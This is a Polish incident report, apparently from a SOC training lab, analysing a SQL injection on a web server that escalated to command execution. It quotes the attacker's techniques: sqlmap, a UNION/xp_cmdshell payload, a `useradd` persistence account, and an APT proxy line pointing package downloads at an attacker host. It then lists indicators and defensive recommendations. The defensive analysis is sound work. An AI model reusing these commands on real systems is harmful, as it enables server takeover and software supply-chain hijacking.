# Raport z Incydentu Bezpieczeństwa: SOC127
**Data raportu:** 2024-03-07  
**Status:** ZAKOŃCZONY (Weryfikacja Poeksploitacyjna)

---

## 1. Podsumowanie (Executive Summary)
Dnia 7 marca 2024 r. o godzinie 12:51 systemy detekcji wykryły zaawansowany atak typu **SQL Injection** wymierzony w serwer `WebServer1000`. Atakujący, wykorzystując narzędzia automatyczne, zdołał zidentyfikować lukę w parametrze `douj`, co doprowadziło do zdalnego wykonania komend (**RCE**) oraz przejęcia kontroli nad mechanizmem aktualizacji systemu (APT Proxy).

---

## 2. Szczegóły Techniczne
| Atrybut | Wartość |
| :--- | :--- |
| **ID Zdarzenia** | 235 (SOC127) |
| **Host / IP** | WebServer1000 / 172.16.20.12 |
| **Wektor Ataku** | SQL Injection (Parametr: `douj`) |
| **Źródłowy adres IP** | `118.194.247.28` (Chiny, Low Reputation) |
| **Złośliwa Domena** | `http://shopproxy.live:4545` |
| **Status połączenia** | Aktywne C2 (Command & Control) |

---

## 3. Analiza Przebiegu Ataku (Attack Kill Chain)

### I. Rozpoznanie i Eksploatacja (Exploitation)
Atakujący użył narzędzia **sqlmap** do zautomatyzowanego badania bazy danych. Po potwierdzeniu podatności za pomocą funkcji logicznych, przesłano złożony ładunek (payload):
* **Technika:** `UNION ALL SELECT` połączony z `EXEC xp_cmdshell`.
* **Cel:** Próba eskalacji do systemu operacyjnego i odczyt pliku `/etc/passwd`. Logi serwera potwierdziły status **Allowed (200 OK)**.

### II. Utrzymanie Dostępu (Persistence)
Na zaatakowanym hoście zarejestrowano następujące aktywności:
* Utworzenie nieautoryzowanego konta użytkownika `test` (`useradd -m test`).
* Wykorzystanie konta `analyst`, co sugeruje skuteczną eskalację uprawnień lokalnych.

### III. Manipulacja Infrastrukturą (Infrastructure Hijacking)
Atakujący zmodyfikował konfigurację menedżera pakietów APT w celu przekierowania ruchu:
* **Ścieżka:** `/etc/apt/apt.conf.d/proxy.conf`
* **Zawartość:** `Acquire::http::Proxy "http://shopproxy.live:4545";`
* **Skutek:** Całkowita kontrola atakującego nad pobieranym przez serwer oprogramowaniem.

### IV. Działania Poeksploitacyjne (Post-Exploitation)
Wykorzystano techniki **Living off the Land (LotL)** w celu ukrycia aktywności:
* Uruchomienie złośliwego skryptu pod nazwą `check-new-release` (Python).
* Próba instalacji narzędzia `iftop` do sniffingu sieciowego.
* Test drożności kanału wyjściowego komendą `ping google.com`.

---

## 4. Wskaźniki Kompromitacji (IoC)
* **IP Atakującego:** `118.194.247.28`
* **IP Serwera C2:** `3.64.163.50`
* **Złośliwy URL:** `http://shopproxy.live:4545`
* **Zmodyfikowany plik:** `/etc/apt/apt.conf.d/proxy.conf`

---

## 5. Podjęte Działania (Response)
1. **Blokada IP:** Zablokowano adres atakującego na zaporze ogniowej.
2. **Izolacja:** Host został odcięty od sieci zewnętrznej w celu powstrzymania komunikacji z C2.
3. **Audyt:** Rozpoczęto analizę integralności plików systemowych pod kątem obecności rootkitów.

---

## 6. Wnioski i Rekomendacje (Lessons Learned)

> [!CAUTION]
> **Stwierdzono krytyczne błędy w konfiguracji uprawnień. Użytkownik bazy danych posiada uprawnienia pozwalające na interakcję z systemem operacyjnym.**

* **Poprawa Kodu:** Wdrożenie **parametryzacji zapytań SQL** (Prepared Statements).
* **Hardening:** * Wyłączenie funkcji `xp_cmdshell` i ograniczenie uprawnień użytkownika bazy danych.
    * Odebranie użytkownikom nieuprzywilejowanym praw zapisu w `/etc/apt/`.
* **Filtracja Ruchu:** Wdrożenie **Egress Filtering** (blokowanie ruchu wychodzącego do nieznanych IP).
* **Monitoring:** Implementacja File Integrity Monitoring (FIM) dla krytycznych katalogów systemowych.